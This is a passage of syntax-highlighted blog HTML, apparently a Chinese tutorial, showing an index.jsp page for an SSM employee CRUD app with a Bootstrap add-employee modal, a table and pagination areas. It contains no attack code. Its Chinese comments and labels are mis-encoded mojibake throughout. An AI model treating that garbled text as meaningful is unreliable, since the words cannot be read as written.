class="keyword">function</span> (<span class="params"></span>) </span>&#123;</span><br><span class="line">    <span class="comment">//æ¸…é™¤æ•°æ®ï¼Œè¡¨å•é‡ç½®</span></span><br><span class="line">    reset_form($(<span class="string">"#empAddModal form"</span>));</span><br></pre></td></tr></table></figure></p><p>å½“å‰çš„index.jsp<br><figure class="highlight erb"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br><span class="line">164</span><br><span class="line">165</span><br><span class="line">166</span><br><span class="line">167</span><br><span class="line">168</span><br><span class="line">169</span><br><span class="line">170</span><br><span class="line">171</span><br><span class="line">172</span><br><span class="line">173</span><br><span class="line">174</span><br><span class="line">175</span><br><span class="line">176</span><br><span class="line">177</span><br><span class="line">178</span><br><span class="line">179</span><br><span class="line">180</span><br><span class="line">181</span><br><span class="line">182</span><br><span class="line">183</span><br><span class="line">184</span><br><span class="line">185</span><br><span class="line">186</span><br><span class="line">187</span><br><span class="line">188</span><br><span class="line">189</span><br><span class="line">190</span><br><span class="line">191</span><br><span class="line">192</span><br><span class="line">193</span><br><span class="line">194</span><br><span class="line">195</span><br><span class="line">196</span><br><span class="line">197</span><br><span class="line">198</span><br><span class="line">199</span><br><span class="line">200</span><br><span class="line">201</span><br><span class="line">202</span><br><span class="line">203</span><br><span class="line">204</span><br><span class="line">205</span><br><span class="line">206</span><br><span class="line">207</span><br><span class="line">208</span><br><span class="line">209</span><br><span class="line">210</span><br><span class="line">211</span><br><span class="line">212</span><br><span class="line">213</span><br><span class="line">214</span><br><span class="line">215</span><br><span class="line">216</span><br><span class="line">217</span><br><span class="line">218</span><br><span class="line">219</span><br><span class="line">220</span><br><span class="line">221</span><br><span class="line">222</span><br><span class="line">223</span><br><span class="line">224</span><br><span class="line">225</span><br><span class="line">226</span><br><span class="line">227</span><br><span class="line">228</span><br><span class="line">229</span><br><span class="line">230</span><br><span class="line">231</span><br><span class="line">232</span><br><span class="line">233</span><br><span class="line">234</span><br><span class="line">235</span><br><span class="line">236</span><br><span class="line">237</span><br><span class="line">238</span><br><span class="line">239</span><br><span class="line">240</span><br><span class="line">241</span><br><span class="line">242</span><br><span class="line">243</span><br><span class="line">244</span><br><span class="line">245</span><br><span class="line">246</span><br><span class="line">247</span><br><span class="line">248</span><br><span class="line">249</span><br><span class="line">250</span><br><span class="line">251</span><br><span class="line">252</span><br><span class="line">253</span><br><span class="line">254</span><br><span class="line">255</span><br><span class="line">256</span><br><span class="line">257</span><br><span class="line">258</span><br><span class="line">259</span><br><span class="line">260</span><br><span class="line">261</span><br><span class="line">262</span><br><span class="line">263</span><br><span class="line">264</span><br><span class="line">265</span><br><span class="line">266</span><br><span class="line">267</span><br><span class="line">268</span><br><span class="line">269</span><br><span class="line">270</span><br><span class="line">271</span><br><span class="line">272</span><br><span class="line">273</span><br><span class="line">274</span><br><span class="line">275</span><br><span class="line">276</span><br><span class="line">277</span><br><span class="line">278</span><br><span class="line">279</span><br><span class="line">280</span><br><span class="line">281</span><br><span class="line">282</span><br><span class="line">283</span><br><span class="line">284</span><br><span class="line">285</span><br><span class="line">286</span><br><span class="line">287</span><br><span class="line">288</span><br><span class="line">289</span><br><span class="line">290</span><br><span class="line">291</span><br><span class="line">292</span><br><span class="line">293</span><br><span class="line">294</span><br><span class="line">295</span><br><span class="line">296</span><br><span class="line">297</span><br><span class="line">298</span><br><span class="line">299</span><br><span class="line">300</span><br><span class="line">301</span><br><span class="line">302</span><br><span class="line">303</span><br><span class="line">304</span><br><span class="line">305</span><br><span class="line">306</span><br><span class="line">307</span><br><span class="line">308</span><br><span class="line">309</span><br><span class="line">310</span><br><span class="line">311</span><br><span class="line">312</span><br><span class="line">313</span><br><span class="line">314</span><br><span class="line">315</span><br><span class="line">316</span><br><span class="line">317</span><br><span class="line">318</span><br><span class="line">319</span><br><span class="line">320</span><br><span class="line">321</span><br><span class="line">322</span><br><span class="line">323</span><br><span class="line">324</span><br><span class="line">325</span><br><span class="line">326</span><br><span class="line">327</span><br><span class="line">328</span><br><span class="line">329</span><br><span class="line">330</span><br><span class="line">331</span><br><span class="line">332</span><br><span class="line">333</span><br><span class="line">334</span><br><span class="line">335</span><br><span class="line">336</span><br><span class="line">337</span><br><span class="line">338</span><br><span class="line">339</span><br><span class="line">340</span><br><span class="line">341</span><br><span class="line">342</span><br><span class="line">343</span><br><span class="line">344</span><br><span class="line">345</span><br><span class="line">346</span><br><span class="line">347</span><br><span class="line">348</span><br><span class="line">349</span><br><span class="line">350</span><br><span class="line">351</span><br><span class="line">352</span><br><span class="line">353</span><br><span class="line">354</span><br><span class="line">355</span><br><span class="line">356</span><br><span class="line">357</span><br><span class="line">358</span><br><span class="line">359</span><br><span class="line">360</span><br><span class="line">361</span><br><span class="line">362</span><br><span class="line">363</span><br><span class="line">364</span><br><span class="line">365</span><br><span class="line">366</span><br><span class="line">367</span><br><span class="line">368</span><br><span class="line">369</span><br><span class="line">370</span><br><span class="line">371</span><br><span class="line">372</span><br><span class="line">373</span><br><span class="line">374</span><br><span class="line">375</span><br><span class="line">376</span><br><span class="line">377</span><br><span class="line">378</span><br><span class="line">379</span><br><span class="line">380</span><br><span class="line">381</span><br><span class="line">382</span><br><span class="line">383</span><br><span class="line">384</span><br><span class="line">385</span><br><span class="line">386</span><br><span class="line">387</span><br><span class="line">388</span><br><span class="line">389</span><br><span class="line">390</span><br><span class="line">391</span><br><span class="line">392</span><br><span class="line">393</span><br><span class="line">394</span><br><span class="line">395</span><br><span class="line">396</span><br><span class="line">397</span><br><span class="line">398</span><br><span class="line">399</span><br><span class="line">400</span><br><span class="line">401</span><br></pre></td><td class="code"><pre><span class="line"><span class="xml"><span class="tag">&lt;<span class="name">%-</span></span></span><span class="ruby">-</span></span><br><span class="line"><span class="ruby">    webè·¯å¾„ï¼š</span></span><br><span class="line"><span class="ruby">        ä¸ä»¥/å¼€å§‹çš„ç›¸å¯¹è·¯å¾„ï¼Œæ‰¾èµ„æºï¼Œä»¥å½“å‰èµ„æºçš„è·¯å¾„ä¸ºåŸºå‡†ï¼Œç»å¸¸å®¹æ˜“å‡ºç°é—®é¢˜</span></span><br><span class="line"><span class="ruby">        ä»¥/å¼€å§‹çš„ç›¸å¯¹è·¯å¾„ï¼Œæ‰¾èµ„æºï¼Œä»¥æœåŠ¡å™¨çš„è·¯å¾„ä¸ºæ ‡å‡†ï¼ˆ<span class="symbol">http:</span>/<span class="regexp">/localhost:3306ï¼‰éœ€è¦åŠ ä¸Šé¡¹ç›®å</span></span></span><br><span class="line"><span class="ruby">            <span class="symbol">http:</span>/<span class="regexp">/localhost:3306/crud</span></span></span><br><span class="line"><span class="ruby">-</span><span class="xml">-%&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="xml"><span class="tag">&lt;<span class="name">%</span></span></span><span class="ruby">@ page contentType=<span class="string">"text/html;charset=UTF-8"</span> language=<span class="string">"java"</span> </span><span class="xml"><span class="tag">%&gt;</span></span></span><br><span class="line"><span class="xml"><span class="tag">&lt;<span class="name">%</span></span></span><span class="ruby">@ taglib uri=<span class="string">"http://java.sun.com/jsp/jstl/core"</span> prefix=<span class="string">"c"</span></span><span class="xml"><span class="tag">%&gt;</span></span></span><br><span class="line"><span class="xml"><span class="tag">&lt;<span class="name">html</span>&gt;</span></span></span><br><span class="line"><span class="xml"><span class="tag">&lt;<span class="name">head</span>&gt;</span></span></span><br><span class="line"><span class="xml">    <span class="tag">&lt;<span class="name">title</span>&gt;</span>å‘˜å·¥åˆ—è¡¨<span class="tag">&lt;/<span class="name">title</span>&gt;</span></span></span><br><span class="line"><span class="xml">    <span class="tag">&lt;<span class="name">%</span></span></span></span><br><span class="line"><span class="ruby">        pageContext.setAttribute(<span class="string">"APP_PATH"</span>,request.getContextPath());</span></span><br><span class="line"><span class="ruby">    </span><span class="xml">%&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="xml">    <span class="tag">&lt;<span class="name">link</span> <span class="attr">href</span>=<span class="string">"$&#123;APP_PATH&#125;/static/bootstrap-3.3.7-dist/css/bootstrap.min.css"</span> <span class="attr">rel</span>=<span class="string">"stylesheet"</span>&gt;</span></span></span><br><span class="line"><span class="xml">    <span class="tag">&lt;<span class="name">script</span> <span class="attr">src</span>=<span class="string">"$&#123;APP_PATH&#125;/static/js/jquery-3.5.1.min.js"</span> <span class="attr">type</span>=<span class="string">"text/javascript"</span>&gt;</span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span></span><br><span class="line"><span class="xml">    <span class="tag">&lt;<span class="name">script</span> <span class="attr">src</span>=<span class="string">"$&#123;APP_PATH&#125;/static/bootstrap-3.3.7-dist/js/bootstrap.min.js"</span>&gt;</span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="xml"><span class="tag">&lt;/<span class="name">head</span>&gt;</span></span></span><br><span class="line"><span class="xml"><span class="tag">&lt;<span class="name">body</span>&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="xml"><span class="comment">&lt;!-- å‘˜å·¥æ·»åŠ çš„æ¨¡æ€æ¡† --&gt;</span></span></span><br><span class="line"><span class="xml"><span class="tag">&lt;<span class="name">div</span> <span class="attr">class</span>=<span class="string">"modal fade"</span> <span class="attr">id</span>=<span class="string">"empAddModal"</span> <span class="attr">tabindex</span>=<span class="string">"-1"</span> <span class="attr">role</span>=<span class="string">"dialog"</span> <span class="attr">aria-labelledby</span>=<span class="string">"myModalLabel"</span>&gt;</span></span></span><br><span class="line"><span class="xml">    <span class="tag">&lt;<span class="name">div</span> <span class="attr">class</span>=<span class="string">"modal-dialog"</span> <span class="attr">role</span>=<span class="string">"document"</span>&gt;</span></span></span><br><span class="line"><span class="xml">        <span class="tag">&lt;<span class="name">div</span> <span class="attr">class</span>=<span class="string">"modal-content"</span>&gt;</span></span></span><br><span class="line"><span class="xml">            <span class="tag">&lt;<span class="name">div</span> <span class="attr">class</span>=<span class="string">"modal-header"</span>&gt;</span></span></span><br><span class="line"><span class="xml">                <span class="tag">&lt;<span class="name">button</span> <span class="attr">type</span>=<span class="string">"button"</span> <span class="attr">class</span>=<span class="string">"close"</span> <span class="attr">data-dismiss</span>=<span class="string">"modal"</span> <span class="attr">aria-label</span>=<span class="string">"Close"</span>&gt;</span><span class="tag">&lt;<span class="name">span</span> <span class="attr">aria-hidden</span>=<span class="string">"true"</span>&gt;</span>&amp;times;<span class="tag">&lt;/<span class="name">span</span>&gt;</span><span class="tag">&lt;/<span class="name">button</span>&gt;</span></span></span><br><span class="line"><span class="xml">                <span class="tag">&lt;<span class="name">h4</span> <span class="attr">class</span>=<span class="string">"modal-title"</span> <span class="attr">id</span>=<span class="string">"myModalLabel"</span>&gt;</span>å‘˜å·¥æ·»åŠ <span class="tag">&lt;/<span class="name">h4</span>&gt;</span></span></span><br><span class="line"><span class="xml">            <span class="tag">&lt;/<span class="name">div</span>&gt;</span></span></span><br><span class="line"><span class="xml">            <span class="tag">&lt;<span class="name">div</span> <span class="attr">class</span>=<span class="string">"modal-body"</span>&gt;</span></span></span><br><span class="line"><span class="xml">                <span class="tag">&lt;<span class="name">form</span> <span class="attr">class</span>=<span class="string">"form-horizontal"</span>&gt;</span></span></span><br><span class="line"><span class="xml">                    <span class="tag">&lt;<span class="name">div</span> <span class="attr">class</span>=<span class="string">"form-group"</span>&gt;</span></span></span><br><span class="line"><span class="xml">                        <span class="tag">&lt;<span class="name">label</span> <span class="attr">class</span>=<span class="string">"col-sm-2 control-label"</span>&gt;</span>empName<span class="tag">&lt;/<span class="name">label</span>&gt;</span></span></span><br><span class="line"><span class="xml">                        <span class="tag">&lt;<span class="name">div</span> <span class="attr">class</span>=<span class="string">"col-sm-10"</span>&gt;</span></span></span><br><span class="line"><span class="xml">                            <span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">"text"</span> <span class="attr">name</span>=<span class="string">"empName"</span> <span class="attr">class</span>=<span class="string">"form-control"</span> <span class="attr">id</span>=<span class="string">"empName_add_input"</span> <span class="attr">placeholder</span>=<span class="string">"empName"</span>&gt;</span></span></span><br><span class="line"><span class="xml">                            <span class="tag">&lt;<span class="name">span</span> <span class="attr">class</span>=<span class="string">"help-block"</span>&gt;</span><span class="tag">&lt;/<span class="name">span</span>&gt;</span></span></span><br><span class="line"><span class="xml">                        <span class="tag">&lt;/<span class="name">div</span>&gt;</span></span></span><br><span class="line"><span class="xml">                    <span class="tag">&lt;/<span class="name">div</span>&gt;</span></span></span><br><span class="line"><span class="xml">                    <span class="tag">&lt;<span class="name">div</span> <span class="attr">class</span>=<span class="string">"form-group"</span>&gt;</span></span></span><br><span class="line"><span class="xml">                        <span class="tag">&lt;<span class="name">label</span> <span class="attr">class</span>=<span class="string">"col-sm-2 control-label"</span>&gt;</span>email<span class="tag">&lt;/<span class="name">label</span>&gt;</span></span></span><br><span class="line"><span class="xml">                        <span class="tag">&lt;<span class="name">div</span> <span class="attr">class</span>=<span class="string">"col-sm-10"</span>&gt;</span></span></span><br><span class="line"><span class="xml">                            <span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">"text"</span> <span class="attr">name</span>=<span class="string">"email"</span> <span class="attr">class</span>=<span class="string">"form-control"</span> <span class="attr">id</span>=<span class="string">"email_add_input"</span> <span class="attr">placeholder</span>=<span class="string">"email@qq.com"</span>&gt;</span></span></span><br><span class="line"><span class="xml">                            <span class="tag">&lt;<span class="name">span</span> <span class="attr">class</span>=<span class="string">"help-block"</span>&gt;</span><span class="tag">&lt;/<span class="name">span</span>&gt;</span></span></span><br><span class="line"><span class="xml">                        <span class="tag">&lt;/<span class="name">div</span>&gt;</span></span></span><br><span class="line"><span class="xml">                    <span class="tag">&lt;/<span class="name">div</span>&gt;</span></span></span><br><span class="line"><span class="xml">                    <span class="tag">&lt;<span class="name">div</span> <span class="attr">class</span>=<span class="string">"form-group"</span>&gt;</span></span></span><br><span class="line"><span class="xml">                        <span class="tag">&lt;<span class="name">label</span> <span class="attr">class</span>=<span class="string">"col-sm-2 control-label"</span>&gt;</span>gender<span class="tag">&lt;/<span class="name">label</span>&gt;</span></span></span><br><span class="line"><span class="xml">                        <span class="tag">&lt;<span class="name">div</span> <span class="attr">class</span>=<span class="string">"col-sm-10"</span>&gt;</span></span></span><br><span class="line"><span class="xml">                            <span class="tag">&lt;<span class="name">label</span> <span class="attr">class</span>=<span class="string">"radio-inline"</span>&gt;</span></span></span><br><span class="line"><span class="xml">                                <span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">"radio"</span> <span class="attr">name</span>=<span class="string">"gender"</span> <span class="attr">id</span>=<span class="string">"gender1_add_input"</span> <span class="attr">value</span>=<span class="string">"M"</span> <span class="attr">checked</span>=<span class="string">"checked"</span>&gt;</span> ç”·</span></span><br><span class="line"><span class="xml">                            <span class="tag">&lt;/<span class="name">label</span>&gt;</span></span></span><br><span class="line"><span class="xml">                            <span class="tag">&lt;<span class="name">label</span> <span class="attr">class</span>=<span class="string">"radio-inline"</span>&gt;</span></span></span><br><span class="line"><span class="xml">                                <span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">"radio"</span> <span class="attr">name</span>=<span class="string">"gender"</span> <span class="attr">id</span>=<span class="string">"gender2_add_input"</span> <span class="attr">value</span>=<span class="string">"F"</span>&gt;</span> å¥³</span></span><br><span class="line"><span class="xml">                            <span class="tag">&lt;/<span class="name">label</span>&gt;</span></span></span><br><span class="line"><span class="xml">                        <span class="tag">&lt;/<span class="name">div</span>&gt;</span></span></span><br><span class="line"><span class="xml">                    <span class="tag">&lt;/<span class="name">div</span>&gt;</span></span></span><br><span class="line"><span class="xml">                    <span class="tag">&lt;<span class="name">div</span> <span class="attr">class</span>=<span class="string">"form-group"</span>&gt;</span></span></span><br><span class="line"><span class="xml">                        <span class="tag">&lt;<span class="name">label</span> <span class="attr">class</span>=<span class="string">"col-sm-2 control-label"</span>&gt;</span>deptName<span class="tag">&lt;/<span class="name">label</span>&gt;</span></span></span><br><span class="line"><span class="xml">                        <span class="tag">&lt;<span class="name">div</span> <span class="attr">class</span>=<span class="string">"col-sm-4"</span>&gt;</span></span></span><br><span class="line"><span class="xml"><span class="tag">&lt;<span class="name">%-</span></span></span><span class="ruby">-                            éƒ¨é—¨æäº¤éƒ¨é—¨idå³å¯-</span><span class="xml"><span class="tag"><span class="attr">-</span>%&gt;</span></span></span><br><span class="line"><span class="xml">                            <span class="tag">&lt;<span class="name">select</span> <span class="attr">class</span>=<span class="string">"form-control"</span> <span class="attr">name</span>=<span class="string">"dId"</span> <span class="attr">id</span>=<span class="string">"dept_add_select"</span>&gt;</span></span></span><br><span class="line"><span class="xml"><span class="tag">&lt;<span class="name">%-</span></span></span><span class="ruby">-                                éƒ¨é—¨åç§°-</span><span class="xml"><span class="tag"><span class="attr">-</span>%&gt;</span></span></span><br><span class="line"><span class="xml">                            <span class="tag">&lt;/<span class="name">select</span>&gt;</span></span></span><br><span class="line"><span class="xml">                        <span class="tag">&lt;/<span class="name">div</span>&gt;</span></span></span><br><span class="line"><span class="xml">                    <span class="tag">&lt;/<span class="name">div</span>&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="xml">                <span class="tag">&lt;/<span class="name">form</span>&gt;</span></span></span><br><span class="line"><span class="xml">            <span class="tag">&lt;/<span class="name">div</span>&gt;</span></span></span><br><span class="line"><span class="xml">            <span class="tag">&lt;<span class="name">div</span> <span class="attr">class</span>=<span class="string">"modal-footer"</span>&gt;</span></span></span><br><span class="line"><span class="xml">                <span class="tag">&lt;<span class="name">button</span> <span class="attr">type</span>=<span class="string">"button"</span> <span class="attr">class</span>=<span class="string">"btn btn-default"</span> <span class="attr">data-dismiss</span>=<span class="string">"modal"</span>&gt;</span>å…³é—­<span class="tag">&lt;/<span class="name">button</span>&gt;</span></span></span><br><span class="line"><span class="xml">                <span class="tag">&lt;<span class="name">button</span> <span class="attr">type</span>=<span class="string">"button"</span> <span class="attr">class</span>=<span class="string">"btn btn-primary"</span> <span class="attr">id</span>=<span class="string">"emp_save_btn"</span>&gt;</span>ä¿å­˜<span class="tag">&lt;/<span class="name">button</span>&gt;</span></span></span><br><span class="line"><span class="xml">            <span class="tag">&lt;/<span class="name">div</span>&gt;</span></span></span><br><span class="line"><span class="xml">        <span class="tag">&lt;/<span class="name">div</span>&gt;</span></span></span><br><span class="line"><span class="xml">    <span class="tag">&lt;/<span class="name">div</span>&gt;</span></span></span><br><span class="line"><span class="xml"><span class="tag">&lt;/<span class="name">div</span>&gt;</span></span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="xml"><span class="tag">&lt;<span class="name">div</span> <span class="attr">class</span>=<span class="string">"container"</span>&gt;</span></span></span><br><span class="line"><span class="xml">    <span class="tag">&lt;<span class="name">%-</span></span></span><span class="ruby">-æ ‡é¢˜-</span><span class="xml"><span class="tag"><span class="attr">-</span>%&gt;</span></span></span><br><span class="line"><span class="xml">    <span class="tag">&lt;<span class="name">div</span> <span class="attr">class</span>=<span class="string">"row"</span>&gt;</span></span></span><br><span class="line"><span class="xml">        <span class="tag">&lt;<span class="name">div</span> <span class="attr">class</span>=<span class="string">"col-md-12"</span>&gt;</span></span></span><br><span class="line"><span class="xml">            <span class="tag">&lt;<span class="name">h1</span>&gt;</span>SSM-CRUD<span class="tag">&lt;/<span class="name">h1</span>&gt;</span></span></span><br><span class="line"><span class="xml">        <span class="tag">&lt;/<span class="name">div</span>&gt;</span></span></span><br><span class="line"><span class="xml">    <span class="tag">&lt;/<span class="name">div</span>&gt;</span></span></span><br><span class="line"><span class="xml">    <span class="tag">&lt;<span class="name">%-</span></span></span><span class="ruby">-æŒ‰é’®-</span><span class="xml"><span class="tag"><span class="attr">-</span>%&gt;</span></span></span><br><span class="line"><span class="xml">    <span class="tag">&lt;<span class="name">div</span> <span class="attr">class</span>=<span class="string">"row"</span>&gt;</span></span></span><br><span class="line"><span class="xml">        <span class="tag">&lt;<span class="name">div</span> <span class="attr">class</span>=<span class="string">"col-md-4 col-md-offset-8"</span>&gt;</span></span></span><br><span class="line"><span class="xml">            <span class="tag">&lt;<span class="name">button</span> <span class="attr">class</span>=<span class="string">"btn btn-primary"</span> <span class="attr">id</span>=<span class="string">"emp_add_modal_btn"</span>&gt;</span>æ–°å¢<span class="tag">&lt;/<span class="name">button</span>&gt;</span></span></span><br><span class="line"><span class="xml">            <span class="tag">&lt;<span class="name">button</span> <span class="attr">class</span>=<span class="string">"btn btn-danger"</span>&gt;</span>åˆ é™¤<span class="tag">&lt;/<span class="name">button</span>&gt;</span></span></span><br><span class="line"><span class="xml">        <span class="tag">&lt;/<span class="name">div</span>&gt;</span></span></span><br><span class="line"><span class="xml">    <span class="tag">&lt;/<span class="name">div</span>&gt;</span></span></span><br><span class="line"><span class="xml">    <span class="tag">&lt;<span class="name">%-</span></span></span><span class="ruby">-æ˜¾ç¤ºè¡¨æ ¼æ•°æ®-</span><span class="xml"><span class="tag"><span class="attr">-</span>%&gt;</span></span></span><br><span class="line"><span class="xml">    <span class="tag">&lt;<span class="name">div</span> <span class="attr">class</span>=<span class="string">"row"</span>&gt;</span></span></span><br><span class="line"><span class="xml">        <span class="tag">&lt;<span class="name">div</span> <span class="attr">class</span>=<span class="string">"col-md-12"</span>&gt;</span></span></span><br><span class="line"><span class="xml">            <span class="tag">&lt;<span class="name">table</span> <span class="attr">class</span>=<span class="string">"table table-hover"</span> <span class="attr">id</span>=<span class="string">"emps_table"</span>&gt;</span></span></span><br><span class="line"><span class="xml">                <span class="tag">&lt;<span class="name">thead</span>&gt;</span></span></span><br><span class="line"><span class="xml">                <span class="tag">&lt;<span class="name">tr</span>&gt;</span></span></span><br><span class="line"><span class="xml">                    <span class="tag">&lt;<span class="name">th</span>&gt;</span>#<span class="tag">&lt;/<span class="name">th</span>&gt;</span></span></span><br><span class="line"><span class="xml">                    <span class="tag">&lt;<span class="name">th</span>&gt;</span>empName<span class="tag">&lt;/<span class="name">th</span>&gt;</span></span></span><br><span class="line"><span class="xml">                    <span class="tag">&lt;<span class="name">th</span>&gt;</span>gender<span class="tag">&lt;/<span class="name">th</span>&gt;</span></span></span><br><span class="line"><span class="xml">                    <span class="tag">&lt;<span class="name">th</span>&gt;</span>email<span class="tag">&lt;/<span class="name">th</span>&gt;</span></span></span><br><span class="line"><span class="xml">                    <span class="tag">&lt;<span class="name">th</span>&gt;</span>deptName<span class="tag">&lt;/<span class="name">th</span>&gt;</span></span></span><br><span class="line"><span class="xml">                    <span class="tag">&lt;<span class="name">th</span>&gt;</span>æ“ä½œ<span class="tag">&lt;/<span class="name">th</span>&gt;</span></span></span><br><span class="line"><span class="xml">                <span class="tag">&lt;/<span class="name">tr</span>&gt;</span></span></span><br><span class="line"><span class="xml">                <span class="tag">&lt;/<span class="name">thead</span>&gt;</span></span></span><br><span class="line"><span class="xml">                <span class="tag">&lt;<span class="name">tbody</span>&gt;</span></span></span><br><span class="line"><span class="xml">                <span class="tag">&lt;<span class="name">%-</span></span></span><span class="ruby">-                    å‘˜å·¥æ•°æ®ç­‰-</span><span class="xml"><span class="tag"><span class="attr">-</span>%&gt;</span></span></span><br><span class="line"><span class="xml">                <span class="tag">&lt;/<span class="name">tbody</span>&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="xml">            <span class="tag">&lt;/<span class="name">table</span>&gt;</span></span></span><br><span class="line"><span class="xml">        <span class="tag">&lt;/<span class="name">div</span>&gt;</span></span></span><br><span class="line"><span class="xml">    <span class="tag">&lt;/<span class="name">div</span>&gt;</span></span></span><br><span class="line"><span class="xml">    <span class="tag">&lt;<span class="name">%-</span></span></span><span class="ruby">-æ˜¾ç¤ºåˆ†é¡µä¿¡æ¯-</span><span class="xml"><span class="tag"><span class="attr">-</span>%&gt;</span></span></span><br><span class="line"><span class="xml">    <span class="tag">&lt;<span class="name">div</span> <span class="attr">class</span>=<span class="string">"row"</span>&gt;</span></span></span><br><span class="line"><span class="xml">        <span class="tag">&lt;<span class="name">%-</span></span></span><span class="ruby">-            åˆ†é¡µæ–‡å­—ä¿¡æ¯-</span><span class="xml"><span class="tag"><span class="attr">-</span>%&gt;</span></span></span><br><span class="line"><span class="xml">        <span class="tag">&lt;<span class="name">div</span> <span class="attr">class</span>=<span class="string">"col-md-6"</span> <span class="attr">id</span>=<span class="string">"page_info_area"</span>&gt;</span></span></span><br><span class="line"><span class="xml">            <span class="tag">&lt;<span class="name">%-</span></span></span><span class="ruby">-            æ˜¾ç¤ºé¡µç ç­‰ä¿¡æ¯-</span><span class="xml"><span class="tag"><span class="attr">-</span>%&gt;</span></span></span><br><span class="line"><span class="xml">        <span class="tag">&lt;/<span class="name">div</span>&gt;</span></span></span><br><span class="line"><span class="xml">        <span class="tag">&lt;<span class="name">%-</span></span></span><span class="ruby">-            åˆ†é¡µæ¡ä¿¡æ¯-</span><span class="xml"><span class="tag"><span class="attr">-</span>%&gt;</span></span></span><br><span class="line"><span class="xml">        <span class="tag">&lt;<span class="name">div</span> <span class="attr">class</span>=<span class="string">"col-md-6"</span> <span class="attr">id</span>=<span class="string">"page_nav_area"</span>&gt;</span></span></span><br><span class="line"><span class="xml">            <span class="tag">&lt;<span class="name">%-</span></span></span><span class="ruby">-            æ˜¾ç¤ºåˆ†é¡µæ¡ä¿¡æ¯-</span><span class="xml"><span class="tag"><span class="attr">-</span>%&gt;</span></span></span><br><span class="line"><span class="xml">        <span class="tag">&lt;/<span class="name">div</span>&gt;</span></span></span><br><span class="line"><span class="xml">    <span class="tag">&lt;/<span class="name">div</span>&gt;</span></span></span><br><span class="line"><span class="xml"><span class="tag">&lt;/<span class="name">div</span>&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="xml"><span class="tag">&lt;<span class="name">script</span> <span class="attr">type</span>=<span class="string">"text/javascript"</span>&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="xml">    var totalRecords;</span></span><br><span class="line"></span><br><span class="line"><span class="xml">    //1.é¡µé¢åŠ è½½å®Œæˆä»¥åï¼Œç›´æ¥å»å‘é€ä¸€ä¸ªajaxè¯·æ±‚ï¼Œè¦åˆ°åˆ†é¡µæ•°æ®</span></span><br><span class="line"><span class="xml">    $(function 